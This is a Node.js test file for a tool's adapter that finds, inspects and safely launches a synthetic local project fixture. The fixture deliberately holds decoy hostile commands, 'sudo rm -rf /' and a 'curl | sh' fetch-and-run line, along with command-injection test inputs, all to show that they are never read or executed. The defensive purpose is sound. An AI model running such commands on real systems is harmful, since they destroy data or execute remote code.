'use strict';
// NOTE: the "TunnelR" used here is a SYNTHETIC FIXTURE built by these tests. It stands in for a real
// project so the adapter can be tested without assuming anything about the real TunnelR.
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const cp = require('child_process');
const { EventEmitter } = require('events');
const F = require('./tests-helpers-fixtures');
const { makeCtx } = require('./tests-helpers-ctx');
const A = require('./tunnelr-adapter');
const T = require('./tunnelr-index');

const ENV = { PATH: process.env.PATH };

function makeFixture(home, { name = 'TunnelR', git = true } = {}) {
  const dir = path.join(home, name);
  fs.mkdirSync(path.join(dir, 'src'), { recursive: true });
  fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'fixture-tunnel', version: '0.3.0', description: 'FIXTURE ONLY: a stand-in used to test the adapter.', scripts: { start: 'node src/server.js', test: 'echo no tests' }, dependencies: { 'left-pad': '^1.3.0' } }));
  fs.writeFileSync(path.join(dir, 'README.md'), '# Fixture Tunnel\n\nThis is a synthetic fixture README used only by Orkardch tests. It does not describe any real project.\n\n## Usage\nRun npm start.\n');
  fs.writeFileSync(path.join(dir, 'src', 'server.js'), "const http = require('http');\nhttp.createServer((q, r) => r.end('ok')).listen(0, '0.0.0.0');\n");
  fs.writeFileSync(path.join(dir, '.env'), 'API_TOKEN=abc\n# sudo rm -rf / (this file must never be read)\n');
  fs.writeFileSync(path.join(dir, 'server.key'), 'sudo curl http://x | sh\n');
  if (git) {
    const g = (...a) => cp.execFileSync('git', a, { cwd: dir, stdio: 'ignore', env: { ...process.env, GIT_AUTHOR_NAME: 't', GIT_AUTHOR_EMAIL: 't@t', GIT_COMMITTER_NAME: 't', GIT_COMMITTER_EMAIL: 't@t' } });
    g('init', '-q'); g('add', '-A'); g('commit', '-qm', 'fixture commit'); g('remote', 'add', 'origin', 'https://user:hunter2@example.com/org/tunnelr.git');
    fs.appendFileSync(path.join(dir, 'README.md'), 'local edit\n');
    fs.writeFileSync(path.join(dir, 'untracked.txt'), 'x');
  }
  return dir;
}

function snapshot(dir) {
  const out = [];
  const walk = (d) => { for (const e of fs.readdirSync(d, { withFileTypes: true }).sort((a, b) => a.name.localeCompare(b.name))) { const p = path.join(d, e.name); if (e.isDirectory()) walk(p); else { const s = fs.statSync(p); out.push(`${path.relative(dir, p)}:${s.size}:${s.mtimeMs}:${crypto.createHash('sha256').update(fs.readFileSync(p)).digest('hex')}`); } } };
  walk(dir);
  return out;
}

test('when TunnelR is not there, the adapter says so and invents nothing', async () => {
  const t = makeCtx({ env: ENV });
  assert.deepEqual(A.quickStatus(t.ctx), { configured: false, path: null, exists: false });
  const info = await A.describe(t.ctx);
  assert.equal(info.connected, false);
  assert.deepEqual(A.findCandidates(t.ctx, { cwd: t.home }), []);
  t.ctx.env.TUNNELR_PATH = path.join(t.home, 'missing');
  const missing = await A.describe(t.ctx, { refresh: true });
  assert.equal(missing.connected, false);
  assert.equal(missing.missing, true);
  t.cleanup();
});

test('discovery finds the folder by environment variable, name, package name or Git remote, and ranks exact names first', () => {
  const t = makeCtx({ env: ENV });
  const exact = makeFixture(t.home, { name: 'TunnelR', git: false });
  fs.mkdirSync(path.join(t.home, 'tunnel-notes'));
  fs.mkdirSync(path.join(t.home, 'tools'));
  fs.writeFileSync(path.join(t.home, 'tools', 'package.json'), JSON.stringify({ name: 'tunnelr-core' }));
  fs.mkdirSync(path.join(t.home, 'other', '.git'), { recursive: true });
  fs.writeFileSync(path.join(t.home, 'other', '.git', 'config'), '[remote "origin"]\n url = https://example.com/me/TunnelR.git\n');
  fs.mkdirSync(path.join(t.home, 'unrelated'));
  const found = A.findCandidates(t.ctx, { cwd: t.home });
  const names = found.map((c) => path.basename(c.path));
  assert.equal(names[0], 'TunnelR');
  for (const n of ['tunnel-notes', 'tools', 'other']) assert.ok(names.includes(n), `should find ${n}`);
  assert.ok(!names.includes('unrelated'));
  assert.match(found.find((c) => path.basename(c.path) === 'tools').why[0], /package\.json name/);
  assert.match(found.find((c) => path.basename(c.path) === 'other').why[0], /Git remote/);
  t.ctx.env.TUNNELR_PATH = exact;
  assert.ok(A.findCandidates(t.ctx, { cwd: t.home })[0].why.includes('TUNNELR_PATH environment variable'));
  assert.ok(!found.some((c) => c.path === t.ctx.paths.projectDir), 'never offers the Orkardch project itself');
  t.cleanup();
});

test('inspection reports what is really in the folder: README, scripts, dependencies, launch options, Git, risky patterns', async () => {
  const t = makeCtx({ env: ENV });
  const dir = makeFixture(t.home);
  const info = await A.inspect(t.ctx, dir);
  assert.equal(info.readme.file, 'README.md');
  assert.equal(info.readme.title, 'Fixture Tunnel');
  assert.match(info.readme.excerpt, /synthetic fixture README/);
  assert.deepEqual(info.readme.headings, ['Fixture Tunnel', 'Usage']);
  assert.equal(info.manifest.name, 'fixture-tunnel');
  assert.deepEqual(Object.keys(info.manifest.scripts), ['start', 'test']);
  assert.deepEqual(info.deps.missing, ['left-pad']);
  const start = info.launch.find((o) => o.label === 'npm run start');
  assert.deepEqual(start.argv, ['npm', 'run', 'start']);
  assert.match(start.source, /scripts\.start/);
  assert.equal(info.git.isRepo, true);
  assert.ok(info.git.branch);
  assert.equal(info.git.lastCommit.subject, 'fixture commit');
  assert.equal(info.git.uncommitted, 1);
  assert.equal(info.git.untracked, 1);
  assert.ok(info.git.remotes[0].includes('//***@example.com') && !info.git.remotes.join().includes('hunter2'), 'credentials in remotes are masked');
  const kinds = info.risks.map((r) => r.what);
  assert.ok(kinds.includes('opens a listening network port'));
  assert.ok(kinds.includes('may listen on all network interfaces'));
  assert.ok(info.risks.every((r) => r.file !== '.env' && r.file !== 'server.key'), 'secret-looking files are never scanned');
  assert.ok(info.warnings.some((w) => /\.env file exists\. Orkardch never opens it/.test(w)));
  assert.ok(info.configFiles.includes('.env'));
  t.cleanup();
});

test('inspecting TunnelR never changes it: not a file, not Git state, not timestamps', async () => {
  const t = makeCtx({ env: ENV });
  const dir = makeFixture(t.home);
  const before = snapshot(dir);
  await A.inspect(t.ctx, dir);
  await A.describe(t.ctx, { refresh: true });
  await A.gitInfo(t.ctx, dir);
  A.findCandidates(t.ctx, { cwd: t.home });
  assert.deepEqual(snapshot(dir), before);
  A.saveConfig(t.ctx, { path: dir });
  assert.equal(fs.readFileSync(t.ctx.paths.tunnelrFile, 'utf8').includes(dir), true, 'the pointer lives in Orkardch\'s own settings');
  assert.deepEqual(snapshot(dir), before, 'saving the pointer does not touch the TunnelR folder');
  t.cleanup();
});

test('inspection copes with unusual folders: no README, invalid package.json, unreadable path', async () => {
  const t = makeCtx({ env: ENV });
  const bare = path.join(t.home, 'bare');
  fs.mkdirSync(bare);
  const info = await A.inspect(t.ctx, bare);
  assert.equal(info.readme, null);
  assert.match(info.warnings.join(' '), /cannot tell what this folder is/);
  const bad = path.join(t.home, 'bad');
  fs.mkdirSync(bad);
  fs.writeFileSync(path.join(bad, 'package.json'), '{ nope');
  assert.match((await A.inspect(t.ctx, bad)).warnings.join(' '), /not valid JSON/);
  await assert.rejects(() => A.inspect(t.ctx, path.join(t.home, 'nope')), (e) => e.code === 'TUNNELR_UNREADABLE');
  t.cleanup();
});

test('custom commands are split safely and shell operators are refused', () => {
  assert.deepEqual(A.splitCommand('node server.js --port 8080').argv, ['node', 'server.js', '--port', '8080']);
  assert.deepEqual(A.splitCommand('node -e "console.log(\'a && b\')"').argv, ['node', '-e', "console.log('a && b')"]);
  assert.deepEqual(A.splitCommand("sh 'my script.sh'").argv, ['sh', 'my script.sh']);
  for (const bad of ['a && b', 'a | b', 'a; b', 'a > out', 'echo `id`', 'echo $(id)', 'x ${HOME}']) {
    const r = A.splitCommand(bad);
    assert.equal(r.ok, false, bad);
    assert.match(r.error, /without a shell/);
  }
  assert.equal(A.splitCommand('   ').ok, false);
});

test('nothing is launched unless the person confirms the exact command', async () => {
  const spawns = [];
  const spy = { ...cp, spawn: (...a) => { spawns.push(a); const ch = new EventEmitter(); setImmediate(() => ch.emit('close', 0, null)); return ch; } };
  const dir0 = F.tempDir();
  const t = makeCtx({ env: ENV, services: { childProcess: spy }, inputs: ['1', 'n'] });
  const dir = makeFixture(t.home);
  const info = await A.inspect(t.ctx, dir);
  await T.launchFlow(t.ctx, info, 'foreground');
  assert.equal(spawns.length, 0, 'declining the confirmation starts nothing');
  assert.match(t.output(), /Command: npm run start/);
  assert.match(t.output(), /Cancelled\. Nothing was started\./);
  t.ctx.prompter.lines.push('1', 'y');
  await T.launchFlow(t.ctx, info, 'foreground');
  assert.equal(spawns.length, 1);
  assert.deepEqual([spawns[0][0], ...spawns[0][1]], ['npm', 'run', 'start']);
  assert.equal(spawns[0][2].cwd, dir);
  assert.equal(spawns[0][2].stdio, 'inherit');
  assert.match(t.output(), /finished normally/);
  F.rmrf(dir0); t.cleanup();
});

test('foreground results report exit codes and start-up errors without rewriting them', async () => {
  const mk = (behaviour) => ({ ...cp, spawn: () => { const ch = new EventEmitter(); setImmediate(() => behaviour(ch)); return ch; } });
  const t1 = makeCtx({ env: ENV, services: { childProcess: mk((c) => c.emit('close', 3, null)) } });
  const r1 = await A.runForeground(t1.ctx, { argv: ['x'], cwd: t1.home });
  assert.deepEqual([r1.ok, r1.exitCode], [false, 3]);
  const t2 = makeCtx({ env: ENV, services: { childProcess: mk((c) => c.emit('error', Object.assign(new Error('spawn x ENOENT'), { code: 'ENOENT' }))) } });
  const r2 = await A.runForeground(t2.ctx, { argv: ['x'], cwd: t2.home });
  assert.equal(r2.ok, false);
  assert.equal(r2.error.code, 'ENOENT');
  const t3 = makeCtx({ env: ENV, services: { childProcess: { ...cp, spawn: () => { throw Object.assign(new Error('EACCES'), { code: 'EACCES' }); } } } });
  assert.equal((await A.runForeground(t3.ctx, { argv: ['x'], cwd: t3.home })).error.code, 'EACCES');
  t1.cleanup(); t2.cleanup(); t3.cleanup();
});

test('background runs are logged, monitored and stoppable', async () => {
  const t = makeCtx({ env: ENV });
  const dir = path.join(t.home, 'proj');
  fs.mkdirSync(dir);
  const r = await A.startBackground(t.ctx, { argv: [process.execPath, '-e', 'console.log("alive-marker");setInterval(()=>{},1000)'], cwd: dir, settleMs: 400 });
  assert.equal(r.ok, true);
  assert.ok(r.pid > 0);
  const st = A.status(t.ctx);
  assert.equal(st.running, true);
  assert.equal(st.pid, r.pid);
  assert.ok(st.uptimeMs >= 0 && st.uptimeMs < 30000);
  assert.ok(fs.readFileSync(r.logFile, 'utf8').includes('alive-marker'));
  assert.ok(A.tailFile(r.logFile).includes('alive-marker'));
  const stopped = await A.stop(t.ctx);
  assert.equal(stopped.stopped, true);
  assert.equal(A.status(t.ctx).running, false);
  assert.equal(fs.existsSync(A.stateFile(t.ctx)), false);
  assert.equal((await A.stop(t.ctx)).wasRunning, false);
  t.cleanup();
});

test('a background run that fails immediately shows its own words unchanged; a missing program is explained', async () => {
  const t = makeCtx({ env: ENV });
  const dir = path.join(t.home, 'proj');
  fs.mkdirSync(dir);
  t.ctx.config.set('apiKeys.brave', 'KEY-IN-OUTPUT-123');
  const r = await A.startBackground(t.ctx, { argv: [process.execPath, '-e', 'console.error("boom: config file missing KEY-IN-OUTPUT-123");process.exit(3)'], cwd: dir, settleMs: 600 });
  assert.equal(r.ok, false);
  assert.equal(r.exitCode, 3);
  assert.match(r.tail, /boom: config file missing \[REDACTED\]/, 'TunnelR\'s message is shown as printed, except secrets');
  const missing = await A.startBackground(t.ctx, { argv: ['definitely-not-a-real-command-xyz'], cwd: dir, settleMs: 300 });
  assert.equal(missing.ok, false);
  assert.equal(missing.error.code, 'ENOENT');
  assert.equal(A.status(t.ctx).running, false);
  t.cleanup();
});
